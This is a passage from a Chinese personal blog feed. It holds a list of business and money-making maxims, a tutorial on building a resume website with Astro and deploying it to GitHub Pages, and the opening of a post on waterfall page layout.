<p>这个仓库可以帮助你学习如何构建可扩展的系统。如果你把里面的案例消化了，应对大厂面试的系统设计题目应该不是问题。</p>
<h2 id="coding-interview-university"><a href="#coding-interview-university" class="headerlink" title="coding-interview-university"></a>coding-interview-university</h2><p><a href="https://github.com/jwasham/coding-interview-university">https://github.com/jwasham/coding-interview-university</a></p>
<p>计算机专业的同学聊起天来不说人话？听不懂一些基础的术语？不了解编译原理，也不了解数据结构？</p>
<p>不要担心。</p>
<p>这是一份成为软件工程师的详细完整的学习计划。它虽然简单，但它是唯一一份面向<code>非科班</code>同学的学习资料。</p>
<p>这个仓库列举了非常基础但是有用的知识点，针对于非计算机专业的学生量身定做。</p>
<p>从它庞大的 star 数来看，还是有很多非科班的同学希望挤上程序员的末班车，供资本家驱使的。</p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>商业黄金逻辑</title>
    <url>/2023/02/02/20230202-%E5%95%86%E4%B8%9A%E9%BB%84%E9%87%91%E9%80%BB%E8%BE%91/</url>
    <content><![CDATA[<p>执行了不一定有什么，不执行什么都没有。</p>
<p><img src="https://cdn.huatree.top/image-20230202221115723.jpg" alt="image-20230202221115723"></p>
<span id="more"></span>

<h2 id="如何评判一个项目值不值得做"><a href="#如何评判一个项目值不值得做" class="headerlink" title="如何评判一个项目值不值得做"></a>如何评判一个项目值不值得做</h2><h3 id="是否具备明显痛点"><a href="#是否具备明显痛点" class="headerlink" title="是否具备明显痛点"></a>是否具备明显痛点</h3><p>痛点往往也是卖点</p>
<p>最正经的商业逻辑 就是基于用户的痛点，找到你产品的卖点</p>
<p>痛点是什么？</p>
<p>说白了就是，想解决却又没有解决的事情，用户害怕，恐惧的事情。基于痛点研发的产品， 用户会主动需要。</p>
<p>当你或者你的产品能解决某类人的某类需求，财源滚滚来。</p>
<h3 id="市场够不够大？潜在的需求用户人群够不够多"><a href="#市场够不够大？潜在的需求用户人群够不够多" class="headerlink" title="市场够不够大？潜在的需求用户人群够不够多?"></a>市场够不够大？潜在的需求用户人群够不够多?</h3><p>教人赚钱就是一个永恒的好项目，因为市场永恒的大，需求的人群无限广；</p>
<p>疼痛体验馆 就不算是一个好生意，很小众，没什么直接的市场人群</p>
<h3 id="利润空间大不大"><a href="#利润空间大不大" class="headerlink" title="利润空间大不大"></a>利润空间大不大</h3><p>利润空间不够大，毛利太薄，很难赚到钱</p>
<p>当你一个产品成本足够低，利润足够大的时候，是一个很重的评判标准</p>
<p>（知识付费的虚拟产品就是最好的例子）</p>
<h3 id="业务模式好不好？有没有正式运营、大力运营的可能性"><a href="#业务模式好不好？有没有正式运营、大力运营的可能性" class="headerlink" title="业务模式好不好？有没有正式运营、大力运营的可能性"></a>业务模式好不好？有没有正式运营、大力运营的可能性</h3><p>赚钱要靠系统，赚钱要有套路!</p>
<p>商业是有模式的</p>
<p>业务模式的好坏直接关系到能否赚钱</p>
<p>而且是否违法，也是一个核心的要点</p>
<h3 id="是否易于推广？有没有成功案例？"><a href="#是否易于推广？有没有成功案例？" class="headerlink" title="是否易于推广？有没有成功案例？"></a>是否易于推广？有没有成功案例？</h3><p>一个项目要想赚钱，不可或缺的一步就是如何把它推广到你的目标客户面前。</p>
<p>只有客户看到了，接触到了，才会去做出选择是否愿意付款购买。</p>
<p>所以，选择的项目一定要适合你去做推广的</p>
<p>当然了，推广的方法各式各样，只要你愿意花钱，什么推广都是容易的，</p>
<p>我们这里说的是否易于推广是指<strong>推广的成本是否在你的承受范围之内</strong>。</p>
<p>成功案例就是<strong>拉低推广成本</strong>的一个好法子</p>
<h2 id="做一份生意之前必须要思考的8件事"><a href="#做一份生意之前必须要思考的8件事" class="headerlink" title="做一份生意之前必须要思考的8件事"></a>做一份生意之前必须要思考的8件事</h2><ol>
<li>为谁服务：B端还是C端？</li>
<li>帮用户解决什么样的问题？</li>
<li>业务范围：国外的，国内的，本地的？</li>
<li>盈利点在哪里？</li>
<li>流量系统如何搭建？</li>
<li>当前赛道是否有头部？如果有，细分领域、IP切细</li>
<li>商业模式是否有对标？</li>
<li>能否打板、复制？</li>
</ol>
<h2 id="赚钱很重要的一个点：跟卖点有关的信息，能收集多少？"><a href="#赚钱很重要的一个点：跟卖点有关的信息，能收集多少？" class="headerlink" title="赚钱很重要的一个点：跟卖点有关的信息，能收集多少？"></a>赚钱很重要的一个点：跟卖点有关的信息，能收集多少？</h2><ul>
<li>哪怕你再忙，再没有精力都好，如果你想赚到钱，好风口好趋势的钱，你都至少要拿出 20%的时间去关注外部的机会，随时了解动态，一旦有合适的机会，果断尝试</li>
<li>一个人要是知道自己一辈子卖什么，痛苦就消失了90%</li>
<li>在这个世界上，一个什么都信的人，他活的一定不如一个什么都不信的人，因为他大概率会被骗到怀疑人生；但是一个什么都不信的人，他活得也不会好到哪去，因为会放弃一轮又一轮的机会。</li>
<li>养成求证搜索的习惯</li>
<li>跟着同行走，永远不会迷路</li>
</ul>
<h2 id="赚钱-x3D-二选一"><a href="#赚钱-x3D-二选一" class="headerlink" title="赚钱&#x3D;二选一"></a>赚钱&#x3D;二选一</h2><h3 id="帮人家赚钱：帮人家解决问题"><a href="#帮人家赚钱：帮人家解决问题" class="headerlink" title="帮人家赚钱：帮人家解决问题"></a>帮人家赚钱：帮人家解决问题</h3><p>有需求就有卖点：</p>
<ul>
<li>学生怎么提高成绩？</li>
<li>高三怎么选专业？</li>
<li>大学生怎么就业？</li>
<li>社会青年怎么创业？</li>
<li>单身的人怎么脱单？</li>
</ul>
<p>这些东西，都是卖点；</p>
<p>卖点就在我们身边，不是在遥不可及的天国。</p>
<ul>
<li><p>没有知识，你就无法发现机会，无法理解商业运转</p>
<p>规则，鱼最难意识到“水”的存在，那些有关财富的秘密，就藏在你不知道的事情里。看到“水”的组好方式，就是阅读，可以带来新视角。</p>
</li>
<li><p>坚持下去，任何一个领域都能赚到钱</p>
</li>
<li><p>当然有的赛道赚钱容易，有的赛道赚钱难点就是这点区别</p>
</li>
<li><p>但坚持下去，一定都是赚钱的，入一个新的种子一样，我今天种下创业知道的种子明天就可以长出创</p>
<p>业指导的果实。</p>
</li>
</ul>
<p>高手一听你开口就知道你是什么维度的，因为你的语言系统骗不了人，你的模式惯性骗不了人，你的</p>
<p>语言骗不了人。</p>
<p>如果你的「个人成长」不能与自己的「生产力」挂钩，那么空谈「个人成长」是一件很“虚”的事情。</p>
<ul>
<li><p>大家都认可的卖点——不赚钱</p>
<p>大家不认可的卖点——赚钱</p>
<p>卖寿衣、棺材赚钱吗？赚钱，但是大家不认可</p>
<p>开超市赚钱吗？不赚钱，但是大家认可</p>
</li>
<li><p>想要提高信息密度，就是靠大量阅读</p>
</li>
<li><p>想要提高知识层面，就是靠接触高维</p>
<p>比如分析领导人讲话，多吃国际政治瓜，最新出台的文件，定时举办的高级会议，大城市政策；如果你的频道，一直就是小地方那点八卦烂新闻，脱离不开那个圈子，那么永远也提高不了认知。</p>
</li>
<li><p>花 30 块钱买一本书，一定要思考如何用书中的知识给自己赚 3000 块。</p>
</li>
</ul>
<h2 id="学习有n种方式"><a href="#学习有n种方式" class="headerlink" title="学习有n种方式"></a>学习有n种方式</h2><ol>
<li>阅读</li>
<li>向比自己牛逼的人提问</li>
<li>在项目中实践</li>
</ol>
<p>假如说真不想死磕阅读，那后两点一定要做得很好，最好能花点钱，年末复盘一下，你会发现，收获大得超乎意料，钱也是。</p>
<ul>
<li><p>如果你急着挣钱，至少也要给自己留下30%的时间，用作赚慢钱的准备。</p>
<p>比如写作，演讲，录课，选歌好股票持有十年的那种，都是慢钱的好方法。</p>
</li>
<li><p>红利来的时候要野蛮生长，拼执行力；红利消失时候，谁的运营更细致谁的赚钱能力更强</p>
</li>
<li><p>如果七点不如别人，努力不如别人，方法不如别人，还指望赚钱就是异想天开</p>
</li>
<li><p>和持续赚钱的人交朋友。也许他们并不会告诉你当下他们在做什么，但了解过去做了什么已经非常有价值了</p>
</li>
</ul>
<h2 id="赚钱无非两种"><a href="#赚钱无非两种" class="headerlink" title="赚钱无非两种"></a>赚钱无非两种</h2><ul>
<li>一种是踩中了一个无法复制的时间点</li>
<li>一种是长期积累后的爆发。第一种因为它很难预测不可控也无法复制，学不来，99%的赚钱都是长期的积累到一定程度在某一刻的爆发，没有一蹴而就。</li>
<li>不要不把合同当回事：合同是商业风险控制中极为重要的保障手段</li>
<li>也不要太把合同当回事：如果合作各方之间的新人基础只有合同，宁可选择不合作。</li>
</ul>
<p>互联网最珍贵的就是注意力和信任，无论用什么手段吸引了别人的注意力，就要努力靠真诚和价值，加上信任，留住别人，不然就成一锤子买卖了。</p>
<ul>
<li>你必须跟一个 100 分的人在一起，你才有可能考到90 分</li>
<li>天天跟一个 50 分的人在一起，你俩能一起及格就不错了</li>
</ul>
<p>都认为发财需要风口，雷军说的嘛，但贫穷不是怪时代的，是要怪自己的，大多数人都是在一次又一次的鄙视中，错失了机会。</p>
<ul>
<li><p>时代给我们最好的风口是什么？</p>
<p>是更新速度快</p>
</li>
<li><p>我们需要准备什么？</p>
<p>是提高对时代的认知，项目遍地都是，认知不是。</p>
</li>
<li><p>对于普通人来说，提升智力和认知，几乎是唯一的路</p>
<p>每个人的行为，都是由他们的认知决定的。如果你现在不觉得一年前的自己是个蠢货，那说明你这一年没学到什么东西</p>
</li>
<li><p>在任何一个平台，先研读规则，打印出来，做到倒背如流，就这一点你可以甩开80%的竞争对手。</p>
</li>
</ul>
<p>免费咨询有免费咨询的答案，付费咨询有付费的答案</p>
<p>手里有现金才有机会</p>
<p>细水长流，天长地久</p>
<p>现金流一直循环，便一直有机会</p>
<p>手里要一直有钱买票</p>
<p>做投资的牛人</p>
<ul>
<li><p>手里有 100 万，90 万放起来吃饭，10 万用来交易</p>
<p>（傻子手里有 100 万，再贷款 200 万赌一次）</p>
</li>
<li><p>很保守，做了 10 年、20 年还在做</p>
<p>（傻子一次、几天、几周就输完了，再也不玩了）</p>
</li>
<li><p>只研究手里的 100 万怎么变成 130 万</p>
<p>（傻子研究怎么把 30 万变成 300 万、3000 万）</p>
</li>
</ul>
<p>要习惯慢慢变富</p>
<p>创业需要先跑通模式，赚到第一块钱</p>
<ul>
<li><p>你内心的那一点点不值钱的虚荣感之外。要模仿就模仿他们赚钱的思路，解决问题的方法，管理的经验</p>
</li>
<li><p>当对手的错误太小时，你去攻击他，他只是受点皮外伤，马上就改过自新，远达不到伤筋动骨的标准，只有等到窟窿大到难以弥补时你再出手，一击毙命</p>
</li>
<li><p>很多事，不是我们做了规划，不是我们想好了再怎么样怎么样</p>
<p>是我们先干起来，在干的过程中慢慢找感觉，慢慢调整。一步到位这事，有点扯淡</p>
</li>
<li><p>习惯性收集项目，习惯性解读项目</p>
</li>
<li><p>多看小人物是怎么发家致富的，小人物多，项目简单，较好复制</p>
</li>
<li><p>少看大人物是怎么发家致富的，大人物少，而且起点高</p>
</li>
<li><p>多收集谁谁谁失败的故事，失败的故事看多了，才会对常识和规律有敬畏</p>
</li>
</ul>
<p>在没赚到第一桶金之前，不要考虑实体项目；第一桶金的额度一般定义为 100 万到300 万。</p>
<p>锁定一个卖点，前期不赚钱，循环的动作不需要太快，只需要对！后期赚钱了，再加快速度!</p>
<ul>
<li><p>赚钱就是日收入的 40%用来打广告，没有这个觉悟，距离年赚千万非常遥远</p>
</li>
<li><p>锁定一个价值主张，用 100 个 1000 个故事，证明它是对的；只要大家认可它是对的，自然对为这个“价值主张”买单</p>
<p>就好像：大家不是为艾灸买单，是为故事买单，为什么有人艾灸出单非常猛？</p>
<p>因为他天天在抖音讲养生，天天在喜马拉讲养生，大家认可他了，他卖什么，大家都抢；某些时候，客户不是上帝，商家才是上帝。去同行那打广告，所有的虚拟资料都免费送。</p>
</li>
<li><p>每个阶段都有很多机会，但只有属于你的机会才叫机会，大量的机会并不属于你，错过是人生的常态，所以不要因为错过而焦虑。</p>
</li>
<li><p>做社群就是做时间的朋友，想收获它的复利，需要你坚守初心，持续创新，在一开始没有很多正反馈时坚持下去。</p>
<p>如果打算做一个社群，请你做好坚持三年慢慢积累人脉的心理准备。</p>
</li>
<li><p>对一些主流观点保持警惕，对一些身边大多数人认同的事情保持独立思考，康德说，启蒙就是敢于运用自己的理性。</p>
</li>
<li><p>所有项目的关键信息，都藏在互联网的某个角落，等待你仔细甄别；当然，更重要的是执行力。</p>
</li>
<li><p>不管看了什么内容，不要有很多感慨，要说自己会去做哪几件事。人与人的之间的根本差距，是知行合一的差距。共勉。</p>
</li>
<li><p>从赚钱这件事情本身来说，有的选择赚短期的快钱、有的选择赚有积累的慢钱，这两个都没有孰对孰错，只有适合与不适合之分。</p>
</li>
<li><p>关注别人的破局点，每个项目都很好，但总是只有一小部分人能做到头部。也许是因为别人做的早，但一定是因为他破过局。</p>
</li>
<li><p>先干再说，绝大部分人还没有到「对时间精打细算」的程度，别犹豫太久，先做起来再调整。</p>
</li>
<li><p>上千万的大钱机会不一定多，但是我觉得现在一年赚几十上百万的机会很多的。</p>
</li>
<li><p>如果你面临一个难题，我相信 99.99%的难题都已经被其他人想到过解决办法了。你的任务未必是自己想一个，而是要找到这个方法或者能解决这个问题的人去请教。</p>
</li>
<li><p>我觉得，任何投资市场都是牛短熊长，几乎每个投资市场都如此。</p>
<p>所以进场的时候就要问自己，我现在在市场的什么位置？我能承受多大的损失？买入的资产我能持有几年且完全不影响我的生活？买入的资产是靠谱的吗？几年之后会不会归零？</p>
</li>
</ul>
<p>赚小钱不难，多看星球的分享，看百篇选 5 篇择一篇，先做，拿到正反馈，建立赚钱的基本逻辑。 赚大钱靠持久，深扎一个领域，把服务价值和上下游都摸透，找机会，去尝试，让业务不断变粗变壮。</p>
<p>有一些看着难，但有价值的事情，克服下，去尝试做做，可能会打开一片新天地。</p>
<p>行骗者，亦有术，亦有道，然成大事者，古来无。</p>
<p>赚钱路上，请教和交流是门学问，这里提一个点，不要说“我知道”。很多人会有一个口头禅“我知道” ，别人和你说个事儿呢，才聊 3 分钟，你就二十多个“我知道” ，好，这下你都知道了？久了，没有人会愿意再带你一起玩的。要明白，好为人师是每个人的潜在自我实现的需求，如果你身边的人都愿意教你帮你，这不是很惬意的事情么？</p>
<ul>
<li>勤则百弊皆除</li>
</ul>
<p>只要我们足够勤奋，一切问题都能得到解决。无论是学习、写作、赚钱，这些事情都需要依赖一个东西：勤奋。甚至，要想做的更好，做的更久，它们只依赖一个东西：勤奋。因为只要你足够勤奋，你就能学会任何知识、技能，你的能力就一定会提高。能力提高了，就能做到更多别人做不到的事情，创造更多价值，自然就能赚到更多钱。</p>
<p><strong>越早理解、接受这点，付诸行动，就越能早点受益。</strong></p>
<p>想要更高效的赚钱，就一定要不断复盘，不断推翻自己，不断重塑自己。承认错误，是更高效赚钱的开始；犯错不值钱，但是犯错后从中吸取养分，那就是最值钱的经历。</p>
<p>学会深度思考分析每一件微小事物的底层逻辑。越是看起来不起眼的事物，背后蕴藏的底层逻辑，可能更有价值。我们经常遇到的难题，解决方案其实往往就在这些看起来不起眼的事物中获得。</p>
<h2 id="三个“经营”"><a href="#三个“经营”" class="headerlink" title="三个“经营”"></a>三个“经营”</h2><h3 id="经营生意"><a href="#经营生意" class="headerlink" title="经营生意"></a>经营生意</h3><p>有格局、有梦想很好，学过很多理论知识也很好，但唯有落地实施了才是真正的创造价值。一定要尽早入世，在世俗中检验自己的所学。唯有经过实践检验、踏踏实实让你赚到了钱的知识，才是真正理解到位的知识。</p>
<p>再小的生意也是一门学问，赚到了钱不意味着搞明白了原理。随时让自己反思两个问题：</p>
<ul>
<li><p>如果事做成功了：哪些经验是可以复制的？哪些是不可控的偶然因素？</p>
</li>
<li><p>如果事做失败了：造成失败的根源在哪？哪些我可以控制，哪些我 不可以控制？我学到了什么？</p>
</li>
</ul>
<p>明明白白的失败，好过糊里糊涂的成功。</p>
<p>不断打磨一段200字的自我介绍：我能给你提供什么价值？如果三言两语说不清楚，大概率是对生意的思考和提炼还没到位。</p>
<h3 id="经营他人"><a href="#经营他人" class="headerlink" title="经营他人"></a>经营他人</h3><p>生意有了起色，事理清楚了，早晚需要处理人的问题：不管是你的客户，还是合作伙伴，还是你的团队成员，都是你需要用心去经营的对象。人事人事，人弄对了，事才能成。</p>
<p>学习如何做一个教练，用平等、尊重、对话式的方式去影响他人。为自己的核心团队&#x2F;高潜力人才&#x2F;重点客户引入外部教练，他们能帮你发现自己的盲点，打开新的可能性。</p>
<p>学会意识到、理解到、会处理人的差异性。人的性格生而不同，不同人对于格局、梦想、幸福、意义的理解是截然不同的。意识到这件事，才能用心去观察和理解，理解到才能去学习应对差异，减少误解，达成共识。</p>
<h3 id="经营自己"><a href="#经营自己" class="headerlink" title="经营自己"></a>经营自己</h3><p>刻意练习多个目标的平衡 你的人生不是只有赚钱，赚钱只是达成目的的手段。伴侣、子女、父母、朋友、自我成长……都是你需要全盘考虑的事情。任何一角出现问题，都会影响到你的生意，以及你的幸福感。</p>
<p>持续内观，探索自我，尤其是对男性来说。同龄的女性，普遍比男性更注重内在的成长，这一点男同胞们需要向她们学习。</p>
<p>探索自己是一项很有难度、持续不断的系统工程。做好心理准备。</p>
<p>请重视个人的“品牌打造” ，不管你做什么，把你自己的朋友圈打开， 把你经历的点点滴滴分享出来。只有 open才能获得更多，往往越是 open的人机会也会对他 open，你就是最好的产品最好的品牌，分享不止，赚钱不止！</p>
<ul>
<li>做项目要快，快速试错，快速总结，快速把握机会放大，想要确认一个项目适不适合自己，最快的办法就是去尝试。</li>
<li>没钱的时候尽量不要碰投钱的项目，大多数回不来本，没钱的时候，尽量用时间、用想法换钱，2023年了，时代发展留给我们最好的机会就是无本套利变得越来越可能了</li>
<li>想赚钱的时候尽量待在一线城市。2021 年了，信息就是钱，尽量快速掌握一手信息。一线城市的氛围也是推进自己成功的一把好手，比如你在深圳吃个快餐隔壁桌都在讲亚马逊，你拿着手机看优酷吃饭还香不</li>
<li>跟谁在一起工作比在哪里工作更重要。一时的工资低不重要，在牛人身边学到的思维方式以及解决问题的能力，这些认知上的提升才是人生中的无价之宝。</li>
<li>看到”别人做到”和”自已做到”永远是两码事，所以觉得可行的项目就去做，不要怕试错，想法太多，不如落地执行。</li>
<li>在一个行业深耕过，有足够的个人积累并且长期保持输出，那么可以考虑将这些素材加以整理出版成书。纸质书是实物，是内容落地的最好形式，更是一个打通线上线下读者群体、构建私域流量的最有效渠道。书一旦出版，它的好处是：能有持续的现金流（稿费）、能持续销售、能积累个人影响力。</li>
<li>每个人都有自己基本盘，清楚自己的定位与现状很重要，自己实力不足，认识那个大佬没用，被那个大佬认识才有用。大佬们经历牛 X，思维也开阔，手段也高明。但是你去学，就可能碰钉子。不是非要固执己见，是想不被带偏太难了，吃自己确实能吃到的肉比较实际，毕竟能翻江倒海的人是少数， 请相信自己的判断。</li>
<li>善于利用各种信息差去产生价值。中国网民太多，有时候你所知道的不代表别人知道，不要小看任何一个在市场上流通的产品，尽管他很 Low（很差）很让你反感，但永远都要知道比你消费观或者说认知观差的人大有人在，这些人就是你的“财神爷”。</li>
<li>在流量没有产出利润时，那流量仅仅只是流量，不代表金钱。有时候粉丝多并不代表产出比高，真正能存活下来的人都是一开始奔着变现走的。</li>
<li>大多数的普通人都是需要即时满足感的，无论是精神上还是物质上。所以，接地气点，谈钱不俗。比如，通过视频号引流，通过社群朋友圈转化成交，直接卖货变现，知识付费变现都能推动你持续地去创作内容， 坚持去做这件事。你得到的正向反馈越多，你做成这件事的几率就越大。</li>
<li>在这个人人都在打造个人 IP 的时代，品牌口碑变得尤为重要，口碑是怎么来的？一点点的积累，一次次的信任，和无数次的打磨和超预期交付。</li>
<li>要相信，你肯定不是最后一个知道赚钱信息的人，最重要的是执行力。</li>
<li>很多词汇是因为要解决某个问题才提出的。比如要解决个人时间不够和能力不足的问题，才有团队和管理问题，因此刚开始起步不需要管这个，而在打造了赚钱机器，需要有规模化赚钱能力时必须需要这个。学习时多问为什么，否则只是学习了词汇而已。</li>
<li>不要浪费一场危机。</li>
<li>穷往往是从认知到行为方式全方位的穷，所以按自己的想法，不容易致富。</li>
<li>执行了不一定有什么，不执行什么都没有。</li>
</ul>
<h2 id="想要升级自己的认知，需要从四方面着手"><a href="#想要升级自己的认知，需要从四方面着手" class="headerlink" title="想要升级自己的认知，需要从四方面着手"></a>想要升级自己的认知，需要从四方面着手</h2><ol>
<li><p>建立认知模型</p>
</li>
<li><p>找到认知升级的通路</p>
</li>
<li><p>掌握认知迭代的思维工具</p>
</li>
<li><p>实践你的认知</p>
</li>
</ol>
<p>我们可以围绕这四个方面去掌握这种自我升级迭代的方法，获得认知能力的提升。当我们的认知能力得到提升，那么我们的世界观、格局、思考问题方式，也会相应地发生改变，从而影响到我们的人生走向。</p>
<ul>
<li><p>建立认知模型</p>
<p>模型，就是把复杂事物的抽象化，变得可视化，让人更容易理解。而建立个人的认知模型，就是理解道与术的概念，是认知升级的基础。其中，打破自身的认知天花板，是建立模型时的重中之重。那什么是认知的“天花板”呢？这就涉及到我们的认知层次。</p>
</li>
</ul>
<h2 id="一般而言，认知的层次分为高低两种"><a href="#一般而言，认知的层次分为高低两种" class="headerlink" title="一般而言，认知的层次分为高低两种"></a>一般而言，认知的层次分为高低两种</h2><h3 id="低级认知能力：识记，理解，应用"><a href="#低级认知能力：识记，理解，应用" class="headerlink" title="低级认知能力：识记，理解，应用"></a>低级认知能力：识记，理解，应用</h3><p>例如面对一条你熟悉的数学公式，你知道这条公式是代表什么，同时也能够理解这条公式是针对什么情况去应用，而你确实能够应用出来。</p>
<p>我们大部分人，都能够掌握这种低级认知能力，帮助我们很好地生活。否则你连手机都不知道是怎么回事，那真的有问题了。</p>
<h3 id="高级认知能力：分析，评判，创造"><a href="#高级认知能力：分析，评判，创造" class="headerlink" title="高级认知能力：分析，评判，创造"></a>高级认知能力：分析，评判，创造</h3><p>例如我们面对某件事情，我们能够把一些看似凌乱的知识点归纳总结起来，找出背后的核心原因。通过深度分析，运用批判性思维，对其进行审视。最后在这个基础上，创造出属于自己的东西，诸如理论、物品等等。</p>
<p>这种认知能力，就并不是每个人都拥有了。只有让自己从低级的认知能力，提升到高级的认知能力，我们才能够打破这个天花板，获得进步。</p>
]]></content>
      <categories>
        <category>经典文章</category>
      </categories>
      <tags>
        <tag>商业</tag>
      </tags>
  </entry>
  <entry>
    <title>构建个人简历网站之Astro初体验</title>
    <url>/2023/02/04/20230204-%E6%9E%84%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%AE%80%E5%8E%86%E7%BD%91%E7%AB%99%E4%B9%8BAstro%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<p><a href="https://astro.build/">Astro</a>建立更快的网站，一个现代化的轻量级静态站点生成器。</p>
<p><img src="https://cdn.huatree.top/image-20230204192719583.png" alt="image-20230204192719583"></p>
<span id="more"></span>

<h2 id="本地创建"><a href="#本地创建" class="headerlink" title="本地创建"></a>本地创建</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pnpm create astro@latest</span><br></pre></td></tr></table></figure>

<p>输入项目名，然后一路回车键</p>
<p><strong>运行体验:</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pnpm dev</span><br></pre></td></tr></table></figure>

<p>浏览器访问：<a href="http://localhost:3000/">http://localhost:3000/</a></p>
<h2 id="组件传参"><a href="#组件传参" class="headerlink" title="组件传参"></a>组件传参</h2><p><a href="https://docs.astro.build/zh-cn/core-concepts/astro-components/#%E7%BB%84%E4%BB%B6%E5%8F%82%E6%95%B0">详见</a></p>
<h2 id="路由规则"><a href="#路由规则" class="headerlink" title="路由规则"></a>路由规则</h2><p><a href="https://docs.astro.build/zh-cn/core-concepts/routing/">详见</a></p>
<h2 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h2><h3 id="solid-js"><a href="#solid-js" class="headerlink" title="solid-js"></a>solid-js</h3><p><a href="https://docs.astro.build/zh-cn/guides/integrations-guide/solid-js/">详见</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pnpx astro add solid</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">pnpm astro add solid</span><br></pre></td></tr></table></figure>

<p>然后一路回车键</p>
<h3 id="互动组件"><a href="#互动组件" class="headerlink" title="互动组件"></a>互动组件</h3><p><a href="https://docs.astro.build/en/core-concepts/framework-components/#using-framework-components">详见</a></p>
<h3 id="客户端指令"><a href="#客户端指令" class="headerlink" title="客户端指令"></a>客户端指令</h3><p><a href="https://docs.astro.build/zh-cn/reference/directives-reference/#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8C%87%E4%BB%A4">详见</a></p>
<h3 id="Astro-群岛"><a href="#Astro-群岛" class="headerlink" title="Astro 群岛"></a>Astro 群岛</h3><p><a href="https://docs.astro.build/zh-cn/concepts/islands/">https://docs.astro.build/zh-cn/concepts/islands/</a></p>
<p>需要额</p>
<h3 id="tailwind"><a href="#tailwind" class="headerlink" title="tailwind"></a>tailwind</h3><p>Tailwind 允许您使用实用程序类而不是编写 CSS。将实用 CSS 类引入项目中的每个<code>.astro</code>文件和<a href="https://docs.astro.build/en/core-concepts/framework-components/">框架组件</a>，同时支持 Tailwind 配置文件。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pnpm astro add tailwind</span><br></pre></td></tr></table></figure>

<p><a href="https://docs.astro.build/zh-cn/guides/integrations-guide/tailwind/">详见</a></p>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p><a href="https://docs.astro.build/zh-cn/guides/deploy/">详见</a></p>
<h3 id="Github-Pages"><a href="#Github-Pages" class="headerlink" title="Github Pages"></a>Github Pages</h3><p><a href="https://docs.astro.build/zh-cn/guides/deploy/github/">详见</a></p>
<h4 id="不一样的部署体验"><a href="#不一样的部署体验" class="headerlink" title="不一样的部署体验"></a>不一样的部署体验</h4><ol>
<li>本地代码推到远程创建的仓库，如<code>resume</code></li>
<li>然后仓库下的 Settings（非我的设置 Settings） &gt; Pages &gt; Build and deployment 下选择 GitHub Actions</li>
<li>接着选择 Static HTML &gt; Configure</li>
<li>当前页面下注意需要部署的分支名，默认是 master（有的可能没有设置远程仓库，默认是 main）</li>
<li>在 Edit new file 区域内，找到 path，路径值改为项目打包的路径名，默认名是**.dist**</li>
<li>最后 Start commit 确认提交，别忘了这个提交需同步到本地仓库</li>
<li>访问静态页面站点，再次打开仓库下的 Settings（非我的设置 Settings） &gt; Pages，已经可以看到访问地址了</li>
</ol>
<p><strong>注意：</strong></p>
<p>默认 astro 创建的项目，忽略文件<code>.gitignore</code>配置了**dist&#x2F;**，需要注释掉，不然 Github Pages 静态网页站点找不到文件内容就 404 了</p>
<p>访问静态站点时，发现样式没生效，F12 查下 html 中引入的 css，访问下，发现找不到文件，加上仓库名（项目名）前缀路径，css 资源有了。这里就需要配置 astro.config.mjs 了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://astro.build/config</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">    <span class="attr">base</span>: <span class="string">&quot;resume&quot;</span>, <span class="comment">// 加上基础路径（项目名）</span></span><br><span class="line">    <span class="attr">integrations</span>: [<span class="title function_">solidJs</span>(), <span class="title function_">tailwind</span>()],</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/huatree/resume">Demo 源码</a></p>
<p><a href="https://wyh.huatree.top/resume/">Demo 展示</a></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://mp.weixin.qq.com/s/1JiTdQDCSbTR3rUtLczdmg">Astro 2.0 正式发布，现代化静态站点生成器</a></p>
<p>[2] <a href="https://www.bilibili.com/video/BV1SW4y1j7Lk/?spm_id_from=333.337.top_right_bar_window_default_collection.content.click&vd_source=9f872c025ebfc90f6b30ef437d9cc2ca">构建个人简历网站 | Astro 初体验 | 五分钟人人都可以拥有属于自己的个人简历网站</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Astro</tag>
        <tag>个人简历</tag>
      </tags>
  </entry>
  <entry>
    <title>探索瀑布流布局</title>
    <url>/2023/03/19/20230319-%E6%8E%A2%E7%B4%A2%E7%80%91%E5%B8%83%E6%B5%81%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<p>瀑布流布局是一种网页布局方式，也称为瀑布流式布局、瀑布流式排版、瀑布流式设计等。它是指将内容按照一定规则排列在不同的列中，形成类似瀑布流般的视觉效果。一般来说，瀑布流布局会自适应屏幕大小，并且具有不规则性，即每个内容块的高度和宽度不一定相等。瀑布流布局在展示图片、文章、商品等内容时比较常见，具有良好的用户体验和视觉效果。</p>
<span id="more"></span>

<h2 id="手写一个瀑布流"><a href="#手写一个瀑布流" class="headerlink" title="手写一个瀑布流"></a>手写一个瀑布流</h2><p><a href="https://github.com/huatree/dev-example/tree/master/waterfall">详见 demo</a></p>
<h2 id="一些值得尝试优化的地方"><a href="#一些值得尝试优化的地方" class="headerlink" title="一些值得尝试优化的地方"></a>一些值得尝试优化的地方</h2><h3 id="瀑布流内容缓存"><a href="#瀑布流内容缓存" class="headerlink" title="瀑布流内容缓存"></a>瀑布流内容缓存</h3><p>涉及的一些关键字段</p>
